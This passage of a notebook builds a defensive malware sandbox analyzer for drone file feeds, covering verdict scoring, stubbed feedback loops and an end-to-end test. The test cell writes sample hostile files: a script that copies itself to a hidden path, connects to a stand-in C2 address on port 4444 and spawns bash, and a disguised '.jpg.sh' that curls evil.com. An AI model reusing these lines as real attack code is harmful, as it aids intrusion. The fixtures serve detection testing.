    bonus_score     : int = 0


def correlate_iocs(file_path: str, events: List[MonitorEvent]) -> IOCResult:
    file_hash  = compute_file_hash(file_path)
    net_iocs   = extract_network_iocs_from_events(events)
    ti_result  = query_threat_intelligence_correlator(
                     file_hash, net_iocs['ips'], net_iocs['domains'])
    result = IOCResult(
        any_match       = ti_result['any_match'],
        matched_hashes  = ti_result['matched_hashes'],
        matched_ips     = ti_result['matched_ips'],
        matched_domains = ti_result['matched_domains'],
        bonus_score     = IOC_MATCH_BONUS if ti_result['any_match'] else 0,
    )
    return result

print('✅ IOC Correlation ready (stub — calls NOT_IMPLEMENTED Threat Intel Correlator)')

✅ IOC Correlation ready (stub — calls NOT_IMPLEMENTED Threat Intel Correlator)


---
## Section 9 — Stage 7: Verdict

### 🔵 Theory

With the final score computed, the sandbox issues one of three verdicts.
The verdict is then passed to the **Response & Quarantine Manager** (a separate module).

```
Score < 25   →  CLEAN      →  Forward to operational network
Score 25–59  →  SUSPICIOUS →  Quarantine + analyst review
Score ≥ 60   →  MALICIOUS  →  Block + alert SOC + flag drone as compromised
```

**Why three levels, not just clean/malicious?**

The SUSPICIOUS band handles uncertainty. A score of 35 could be:
- A file that does one moderately suspicious thing but nothing conclusively malicious
- A sophisticated threat that evades full detection but shows some signs

Rather than guessing, we quarantine it and let a human analyst decide.
The analyst's decision is then fed back into the system to improve future accuracy.

**Module Boundary:**
The `notify_response_manager()` function below is a STUB.
The actual action (allow, quarantine, block, alert) is taken by the
**Response & Quarantine Manager** module — not by this sandbox.


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# STAGE 7: Verdict
# ─────────────────────────────────────────────────────────────────────────────

class Verdict(Enum):
    CLEAN      = 'CLEAN'
    SUSPICIOUS = 'SUSPICIOUS'
    MALICIOUS  = 'MALICIOUS'

VERDICT_THRESHOLDS = {Verdict.MALICIOUS: 60, Verdict.SUSPICIOUS: 25}
VERDICT_ACTIONS    = {
    Verdict.CLEAN      : 'Forward file to operational network',
    Verdict.SUSPICIOUS : 'Quarantine. Queue for analyst review.',
    Verdict.MALICIOUS  : 'Block. Alert SOC/SIEM. Flag drone feed as compromised.',
}


def determine_verdict(risk_score: int) -> Verdict:
    if risk_score >= VERDICT_THRESHOLDS[Verdict.MALICIOUS]:  return Verdict.MALICIOUS
    if risk_score >= VERDICT_THRESHOLDS[Verdict.SUSPICIOUS]: return Verdict.SUSPICIOUS
    return Verdict.CLEAN


def notify_response_manager(verdict: Verdict, file_path: str, score: int,
                             drone_id: str) -> None:
    """
    NOT_IMPLEMENTED — stub only.

    In the full system, this sends the verdict to the Response & Quarantine Manager
    (Module 9 in the project architecture), which executes the actual allow/block/quarantine.

    For now: just logs the action.
    """
    print(f'[Response Manager — STUB] Verdict={verdict.value} | '
          f'Score={score} | File={os.path.basename(file_path)} | Drone={drone_id}')
    print(f'[Response Manager — STUB] Action: {VERDICT_ACTIONS[verdict]}')


@dataclass
class SandboxReport:
    """Complete output of one sandbox run. Returned to the calling module."""
    file_path       : str
    file_hash       : str
    file_category   : str
    verdict         : Verdict
    risk_score      : int
    score_breakdown : ScoreBreakdown
    ioc_result      : IOCResult
    events          : List[MonitorEvent]
    action          : str
    duration_sec    : float

    def summary(self):
        icon = {'CLEAN':'🟢','SUSPICIOUS':'🟡','MALICIOUS':'🔴'}[self.verdict.value]
        lines = [
            f'\n{"═"*62}',
            f'  SANDBOX REPORT',
            f'  File     : {os.path.basename(self.file_path)}',
            f'  Hash     : {self.file_hash[:20]}...',
            f'  Category : {self.file_category}',
            f'  Duration : {self.duration_sec}s  |  Events: {len(self.events)}',
            f'  Score    : {self.risk_score}',
            f'  {"─"*58}',
            f'  {icon} VERDICT : {self.verdict.value}',
            f'  ACTION   : {self.action}',
        ]
        if self.ioc_result.any_match:
            lines.append(f'  IOC MATCH: IPs={self.ioc_result.matched_ips}')
        if self.score_breakdown.top_factors:
            lines.append('  Top risk factors:')
            for f in self.score_breakdown.top_factors: lines.append(f'    • {f}')
        lines.append('═'*62)
        return '\n'.join(lines)

print('✅ Verdict engine ready')

✅ Verdict engine ready


---
## Section 10 — Stage 8: Feedback Loop

### 🔵 Theory

The sandbox does not stop at a verdict. It sends its findings back to improve
the rest of the system.

**Three feedback channels:**

```
Sandbox result
    │
    ├──► Security Feedback Loop / Dashboard (Module 9 in project)
    │      - Logs all verdicts and behavioral traces
    │      - Sends labeled data to ML Classifier for retraining
    │      - Sends context to Game-Theoretic Estimator for refinement
    │
    ├──► Threat Intelligence Correlator (Module 8)
    │      - If MALICIOUS: add file hash to IOC database
    │      - If new C2 IP observed: add to IP blacklist
    │
    └──► Response & Quarantine Manager (Module 9)
           - SUSPICIOUS: wait for analyst decision, feed that back too
```

**All three functions below are STUBS.**
They log what *would* happen in the real system.
They will be replaced with real API calls when modules are connected.

**Module boundaries per BEL project proposal:**
- The Sandbox Analyzer is one component of the Multi-Layer Malware Detection Engine
- It produces a `SandboxReport` and returns it
- The calling module (Inspection Strategy Selector) passes results to the Response Manager
- The Security Feedback Loop / Dashboard is a separate top-level module


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# STAGE 8: Feedback Loop — ALL STUBS
#
# ⚠️ These are placeholders. The actual implementations belong to:
#    - notify_feedback_loop()    → Security Feedback Loop & Dashboard (Module 9)
#    - update_ioc_database()     → Threat Intelligence Correlator (Module 8)
#    - queue_for_ml_retraining() → ML Classifier module
# ─────────────────────────────────────────────────────────────────────────────

def notify_feedback_loop(report: SandboxReport, drone_id: str) -> None:
    """
    NOT_IMPLEMENTED — stub only.
    In the full system: sends the sandbox report to the Security Feedback Loop
    and Dashboard module for logging, analytics, and incident reporting.
    """
    print(f'[Feedback Loop — STUB] Would log SandboxReport for {os.path.basename(report.file_path)}')
    print(f'[Feedback Loop — STUB] Drone: {drone_id} | Verdict: {report.verdict.value} | Score: {report.risk_score}')


def update_ioc_database(report: SandboxReport) -> None:
    """
    NOT_IMPLEMENTED — stub only.
    In the full system: if verdict is MALICIOUS, adds the file hash and observed
    C2 IPs to the Threat Intelligence Correlator's database so future files
    with the same hash are caught immediately at Stage 6.
    """
    if report.verdict == Verdict.MALICIOUS:
        print(f'[IOC Update — STUB] Would add hash {report.file_hash[:16]}... to IOC DB')
        if report.ioc_result.matched_ips:
            print(f'[IOC Update — STUB] Would confirm IPs: {report.ioc_result.matched_ips}')
    else:
        print(f'[IOC Update — STUB] No update (verdict is {report.verdict.value})')


def queue_for_ml_retraining(report: SandboxReport) -> None:
    """
    NOT_IMPLEMENTED — stub only.
    In the full system: sends the behavioral trace (list of event categories + verdict)
    to the ML Classifier module as a labeled training sample.
    This is how the AI/ML layer learns from the sandbox's findings.
    """
    trace = [ev.category for ev in report.events]
    label = 1 if report.verdict == Verdict.MALICIOUS else 0
    print(f'[ML Queue — STUB] Would send trace {trace} with label={label} to ML Classifier')


def run_feedback_loop(report: SandboxReport, drone_id: str) -> None:
    """Orchestrates all three feedback channels."""
    print('\n--- Feedback Loop (all stubs) ---')
    notify_feedback_loop(report, drone_id)
    update_ioc_database(report)
    queue_for_ml_retraining(report)

print('✅ Feedback Loop stubs ready')
print('   (All three functions are NOT_IMPLEMENTED placeholders)')

✅ Feedback Loop stubs ready
   (All three functions are NOT_IMPLEMENTED placeholders)


---
## Section 11 — Full Pipeline: SandboxAnalyzer Class

This class ties all 8 stages together. It is what the Inspection Strategy Selector
would call when it decides a file needs sandbox analysis.

**Interface:**
```python
analyzer = SandboxAnalyzer()
report   = analyzer.analyze(file_path, drone_id='DRONE_04')
# report.verdict      → Verdict.CLEAN / SUSPICIOUS / MALICIOUS
# report.risk_score   → integer
# report.action       → what to do next (for Response Manager)
# report.events       → full timestamped event log
```


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# FULL PIPELINE: SandboxAnalyzer
# ─────────────────────────────────────────────────────────────────────────────

class SandboxAnalyzer:
    """
    Orchestrates all 8 stages of the sandbox pipeline.
    Called by the Inspection Strategy Selector when threat score is HIGH.
    Returns a SandboxReport with verdict and full behavioral trace.
    """

    def analyze(self, file_path: str, drone_id: str = 'UNKNOWN') -> SandboxReport:
        start  = time.time()
        events : List[MonitorEvent] = []
        print(f'\n🔬 Sandbox: {os.path.basename(file_path)}  (drone: {drone_id})')

        # Stage 1: Route
        routing = route_file(file_path)
        print(f'  [S1] Category: {routing["category"].value}  Magic bytes: {routing["magic_match"]}')

        if routing['should_skip']:
            print('  [S1] Safe file — skipping deep analysis')
            return self._clean_report(file_path, routing, start)

        if routing['category'] == FileCategory.WINDOWS:
            print('  [S1] Windows executable — flagging for manual review')
            return self._clean_report(file_path, routing, start)

        files_to_analyze = [file_path]
        archive_extra_score = 0

        # Stage 2: Archive
        if routing['category'] == FileCategory.ARCHIVE:
            out_dir    = tempfile.mkdtemp(prefix='sandbox_arc_')
            arc_result = handle_archive(file_path, out_dir)
            print(f'  [S2] Archive: {len(arc_result.extracted_files)} files | '
                  f'Extra risk: +{arc_result.extra_risk_score}')
            for flag in arc_result.suspicious_flags:
                print(f'       ⚠️  {flag}')
                events.append(MonitorEvent(time.time(), 'ArchiveHandler',
                    'file_write_executable' if 'extension' in flag.lower() else 'high_entropy_write',
                    flag))
            archive_extra_score = arc_result.extra_risk_score
            if arc_result.success:
                files_to_analyze = arc_result.extracted_files

        # Stages 3+4: Execute + Monitor
        for fpath in files_to_analyze:
            fr = route_file(fpath)
            if fr['should_skip'] or fr['category'] == FileCategory.WINDOWS:
                continue

            print(f'  [S3] Executing: {os.path.basename(fpath)}')
            file_log = EventLog()

            try:
                cmd = ([fr['interpreter'], fpath] if fr['interpreter'] else [fpath])
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    env={}, cwd=tempfile.mkdtemp(), preexec_fn=_apply_resource_limits)
                pid  = proc.pid

                fs_m = FileSystemMonitor(pid, file_log)
                net_m = NetworkMonitor(file_log)
                prc_m = ProcessMonitor(pid, file_log)
                prv_m = PrivilegeMonitor(pid, file_log)

                def _kill():
                    time.sleep(LIMITS['wall_timeout'])
                    if proc.poll() is None: proc.kill()
                threading.Thread(target=_kill, daemon=True).start()

                while proc.poll() is None:
                    fs_m.poll(); net_m.poll(); prc_m.poll(); prv_m.poll()
                    time.sleep(0.2)
                proc.communicate(timeout=2)

                file_events = file_log.all_events()
                events.extend(file_events)
                print(f'  [S4] {len(file_events)} events recorded')
            except Exception as e:
                print(f'  [S3] Execution error: {e}')

        # Stage 5: Score
        sb = compute_risk_score(events)
        print(f'  [S5] Behavior score: {sb.total_score}  +archive: {archive_extra_score}')

        # Stage 6: IOC
        ioc = correlate_iocs(file_path, events)
        final = sb.total_score + archive_extra_score + ioc.bonus_score
        if ioc.any_match:
            print(f'  [S6] IOC match! +{ioc.bonus_score} → total: {final}')
        else:
            print(f'  [S6] No IOC match. Total score: {final}')

        # Stage 7: Verdict
        verdict = determine_verdict(final)
        action  = VERDICT_ACTIONS[verdict]
        print(f'  [S7] Verdict: {verdict.value}')
        notify_response_manager(verdict, file_path, final, drone_id)

        report = SandboxReport(
            file_path=file_path, file_hash=compute_file_hash(file_path),
            file_category=routing['category'].value, verdict=verdict,
            risk_score=final, score_breakdown=sb, ioc_result=ioc,
            events=events, action=action,
            duration_sec=round(time.time()-start, 2)
        )

        # Stage 8: Feedback (stubs)
        run_feedback_loop(report, drone_id)
        return report

    def _clean_report(self, file_path, routing, start):
        empty = ScoreBreakdown(0, {}, {}, [])
        return SandboxReport(
            file_path=file_path, file_hash=compute_file_hash(file_path),
            file_category=routing['category'].value, verdict=Verdict.CLEAN,
            risk_score=0, score_breakdown=empty, ioc_result=IOCResult(),
            events=[], action=VERDICT_ACTIONS[Verdict.CLEAN],
            duration_sec=round(time.time()-start, 4)
        )

print('✅ SandboxAnalyzer ready')

✅ SandboxAnalyzer ready


---
## Section 12 — End-to-End Test

Four files covering the full range of scenarios.

In [ ]:
analyzer = SandboxAnalyzer()
demo_dir = tempfile.mkdtemp(prefix='e2e_test_')
print('='*62)
print('  END-TO-END PIPELINE TEST — 4 FILES')
print('='*62)

# File 1: Safe CSV
f1 = os.path.join(demo_dir, 'telemetry.csv')
open(f1, 'w').write('lat,lon,alt\n28.61,77.20,120')
print(analyzer.analyze(f1, 'DRONE_04').summary())

# File 2: Script that spawns a subprocess (suspicious)
f2 = os.path.join(demo_dir, 'suspicious.py')
open(f2, 'w').write("""
import subprocess, time
subprocess.run(['ls', '/tmp'], capture_output=True)
time.sleep(0.3)
""")
print(analyzer.analyze(f2, 'DRONE_04').summary())

# File 3: Malicious — copies itself, connects to known C2, spawns shell
f3 = os.path.join(demo_dir, 'malware.py')
open(f3, 'w').write("""
import shutil, subprocess, socket, time, os
try: shutil.copy(__file__, '/tmp/.hidden_malware.py')
except: pass
try:
    s = socket.socket(); s.settimeout(1)
    s.connect(('203.0.113.42', 4444)); s.close()
except: pass
try: subprocess.run(['bash', '-c', 'id'], capture_output=True, timeout=2)
except: pass
time.sleep(0.3)
""")
print(analyzer.analyze(f3, 'DRONE_04').summary())

# File 4: ZIP with double-extension disguised file inside
f4 = os.path.join(demo_dir, 'mission_data.zip')
with zipfile.ZipFile(f4, 'w') as zf:
    zf.writestr('flight_log.csv', 'ts,lat,lon\n1000,28.6,77.2')
    zf.writestr('recon.jpg.sh', '#!/bin/bash\ncurl http://evil.com/c2')
print(analyzer.analyze(f4, 'DRONE_07').summary())

  END-TO-END PIPELINE TEST — 4 FILES

🔬 Sandbox: telemetry.csv  (drone: DRONE_04)
  [S1] Category: safe  Magic bytes: False
  [S1] Safe file — skipping deep analysis

══════════════════════════════════════════════════════════════
  SANDBOX REPORT
  File     : telemetry.csv
  Hash     : 6ec03662d3754805d2de...
  Category : safe
  Duration : 0.0003s  |  Events: 0
  Score    : 0
  ──────────────────────────────────────────────────────────
  🟢 VERDICT : CLEAN
  ACTION   : Forward file to operational network
══════════════════════════════════════════════════════════════

🔬 Sandbox: suspicious.py  (drone: DRONE_04)
  [S1] Category: script  Magic bytes: False
  [S3] Executing: suspicious.py
  [S4] 0 events recorded
  [S5] Behavior score: 0  +archive: 0
[IOC] NOTE: Using stub IOC database. In production, this calls the Threat Intelligence Correlator module.
  [S6] No IOC match. Total score: 0
  [S7] Verdict: CLEAN
[Response Manager — STUB] Verdict=CLEAN | Score=0 | File=suspicious.py | Drone=D

---
## Section 13 — Quick Reference Card

```
SANDBOX ANALYZER — QUICK REFERENCE
════════════════════════════════════════════════════════════════

MODULE POSITION IN SYSTEM:
  Ingestion Interceptor
  → Game-Theoretic Threat Estimator
  → Inspection Strategy Selector
  → [Signature Scanner | AI/ML Classifier | SANDBOX ANALYZER] ← here
  → Metadata Sanitizer
  → Threat Intelligence Correlator
  → Response & Quarantine Manager
  → Security Dashboard & Feedback Loop

SANDBOX TRIGGERS WHEN:
  Game-Theoretic Estimator assigns HIGH threat score

INTERNAL STAGES:
  Stage 1  File Router           magic bytes → true file type
  Stage 2  Archive Handler       encrypted=suspicious, no pwd cracking
                                  double extension detection, ZIP bomb check
                                  recursive extraction (max depth 3)
  Stage 3  Execution Env         128MB RAM, 20s CPU, 32MB file, 50 procs
                                  empty env vars, isolated cwd, 30s watchdog
  Stage 4  Four Monitors (200ms poll)
             FileSystem  /proc/PID/fd + fdinfo
             Network     /proc/net/tcp diff (baseline vs live)
             Process     psutil process tree
             Privilege   /proc/PID/status (CapEff + VmRSS)
  Stage 5  Risk Scoring          sum of BEHAVIOR_WEIGHTS per event
  Stage 6  IOC Correlation       hash + IPs + domains vs threat intel
                                  calls Threat Intel Correlator (STUB)
  Stage 7  Verdict               CLEAN<25 | SUSPICIOUS 25-59 | MALICIOUS≥60
                                  calls Response Manager (STUB)
  Stage 8  Feedback              calls Dashboard, IOC DB, ML queue (all STUBS)

KEY DESIGN DECISIONS:
  ✅ No password cracking — encrypted archive = suspicious indicator (+25)
  ✅ Magic bytes over file extension (catches disguised files)
  ✅ /proc filesystem — kernel-level, cannot be spoofed by monitored process
  ✅ Additive scoring — pattern of behaviour, not single actions
  ✅ Feedback stubs — sandbox is self-contained, integration is explicit

INTEGRATION CALL:
  analyzer = SandboxAnalyzer()
  report   = analyzer.analyze(file_path, drone_id='DRONE_01')
  # report.verdict      → Verdict enum
  # report.risk_score   → int
  # report.action       → string for Response Manager
  # report.events       → List[MonitorEvent]

RESEARCH REFERENCES:
  Dynamic analysis superiority:
    Guven (2024) IJCESEN — sandbox + network + AI pipeline
    https://doi.org/10.22399/ijcesen.460

  Linux /proc monitoring for malware:
    Cozzi et al. (2018) IEEE Oakland — Understanding Linux Malware
    https://ieeexplore.ieee.org/document/8418602

  Archive-based malware delivery:
    HP Wolf Security Q3/Q4 2022 — archives = #1 delivery vector (42-44%)
    https://threatresearch.ext.hp.com/hp-wolf-security-threat-insights-report-q4-2022/

  C2 server behaviour:
    Varonis: https://www.varonis.com/blog/what-is-c2
    CrowdStrike: https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/command-and-control-cac-attack/

  IOC / Threat Intelligence:
    MITRE ATT&CK: https://attack.mitre.org
    CISA: https://www.cisa.gov/topics/cyber-threats-and-advisories
════════════════════════════════════════════════════════════════
```
